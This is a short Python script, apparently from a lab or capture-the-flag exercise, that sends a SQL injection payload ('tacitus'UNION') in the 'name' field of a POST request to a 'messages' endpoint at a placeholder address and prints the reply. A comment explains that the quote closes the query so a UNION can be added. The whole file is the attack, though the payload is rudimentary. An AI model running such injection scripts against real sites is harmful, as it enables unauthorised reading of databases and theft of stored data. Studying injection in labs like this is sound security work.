from bs4 import BeautifulSoup
import requests
import sys 

address = "0.0.0.0"
extension = "messages"
## This query injects using the ' character that ends the query and allows unions
injection = "tacitus'UNION"

r = requests.post("http://{0}/{1}".format(address, extension), data={"name":injection})
print(r.text)